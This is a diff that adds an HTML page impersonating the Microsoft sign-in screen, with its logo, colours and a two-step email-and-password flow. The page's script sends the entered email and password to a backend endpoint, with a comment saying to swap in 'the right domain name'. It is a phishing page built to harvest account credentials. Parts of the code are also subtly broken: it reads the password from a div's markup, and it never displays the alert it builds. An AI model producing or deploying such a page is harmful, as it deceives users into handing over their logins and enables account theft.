@@ -1,0 +1,189 @@
+<html>
+    <head>
+        <title>Microsoft</title>
+        <meta charset="UTF-8">
+        <meta name="viewport"
+              content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <style>
+            @media screen and (max-width: 470px){
+                body{
+                    background-color: #FFFFFF;
+                }
+            }
+            body{
+                background-color:#D4DBE4;
+                height: 100%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+         
+            .overall-form-container{
+                box-shadow: 2px 2px 2px 2px rgb(184, 181, 181);
+                background-color: #FFFFFF;
+                width: 300px;
+                padding-top: 1rem;
+                padding-bottom: 3rem;
+                padding-left: 4rem;
+                padding-right: 4rem;
+            }
+            @media screen and (max-width: 470px){
+                body{
+                    background-color: #FFFFFF;
+                    align-items: initial;
+                    justify-content: initial;
+                }
+                .overall-form-container{
+                    box-shadow: initial;
+                    padding: 0 1rem;
+                }
+            }
+            .logo img{
+                 height: 100%;
+                 width: 100%;
+            }
+            .logo-container{
+                height: 30px;
+                width: 30px;
+            }
+            h3{
+                color:#848484;
+                font-size: 1.3rem;
+            }
+            .logo{
+                display: flex;
+                align-items: center;
+                margin-bottom: -1.5rem;
+            }
+            h2{
+                color: #313131;
+            }
+            input::placeholder{
+                font-size: 1rem;
+                font-weight: 100;
+                margin-bottom: 1rem;
+            }
+            input{
+                margin: 1rem 0;
+                border: none;
+                border-bottom: 1px solid #0067B8;
+                width: 100%;
+            }
+            .blue{
+                color: #0067B8;
+            }
+            .submit-button{
+                border: 1px solid #0067B8;
+                background-color:#0067B8;
+                color: #fff;
+                display: inline-block;
+                cursor: pointer;
+                padding: 0.5rem 1.3rem;
+                font-size: 0.9rem;
+            }
+            .submit-button-container{
+                margin-top: 1rem;
+                display: flex;
+                align-items: center;
+                justify-content: flex-end;
+            }
+            input:focus{ outline: none; }
+            .text-account p{
+                color: rgb(32, 32, 32);
+            }
+            .alert {
+                position: absolute;
+                font-size: 14px;
+                color: #0067B8;
+                background-color: #fff;
+                padding: 10px 5px 10px 5px;
+                top: 50%;
+                left: 50%;
+                margin-top: -50%;
+                margin-left: -100%;
+            }
+        </style>
+    </head>
+    <body>
+        <form class='overall-form-container' method="POST">
+            <div class='header-form'>
+                <div class='logo'>
+                    <div class='logo-container'>
+                    <img src='microsoft-logo.png' alt="Microsoft" />
+                </div>
+                    <h3>Microsoft</h3>
+                </div>
+                <h2>Sign in</h2>
+            </div>
+            <div class='form-container'>
+                <div class='email'>
+                    <input type="email" id='email' required name='email' placeholder='Email, phone or skype'/>
+                </div>
+                <div class='text-account'>
+                    <p>No account? <span class='blue'>create one!</span></p>
+                </div>
+                <div class='password' id='password'>
+                    <input type="password" required name='password' placeholder="Password"/>
+                </div>
+                <div class='submit-button-container'>
+                    <button type='submit' class='submit-button' id='submit'>Sign in</button>
+                </div>
+                <div class='submit-button-container'>
+                    <button class='submit-button' id='next'>Next</button>
+                </div>
+            </div>
+        </form>
+        
+    <script>
+        var submit = document.getElementById('submit');
+        var password = document.getElementById('password');
+        var email = document.getElementById('email');
+        var next = document.getElementById('next')
+        var form = document.querySelector("form");
+
+        submit.style.display ='none'
+        password.style.display ='none'
+
+        next.addEventListener('click', function(){
+            submit.style.display ='block'
+            password.style.display ='block'
+            next.style.display ='none'
+            email.style.display ='none'
+        })
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            var formBody = new FormData(e.target);
+            //change according to the right domain name
+            fetch("http://localhost:3030/api/user/signin", {
+                headers: {
+                    'Accept': "application/json",
+                    'Content-Type': "application/json"
+                },
+                method: "POST",
+                body: JSON.stringify({
+                    email: email.value, 
+                    password: password.innerHTML
+                })
+            })
+            .then(res => res.text())
+            .then(res => {
+                let successMessage = document.createElement("div");
+                successMessage.className = "alert";
+                let messageText = document.createTextNode(res);
+                let okButton = document.createElement("button");
+                okButton.addEventListener('click', () => {
+                    successMessage.style.display = "none";
+                })
+                successMessage.appendChild(messageText);
+                successMessage.appendChild(okButton);
+            })
+            .catch(err => {
+                console.error(err.message);
+            });
+        });
+
+    </script>
+    </body>
+</html>
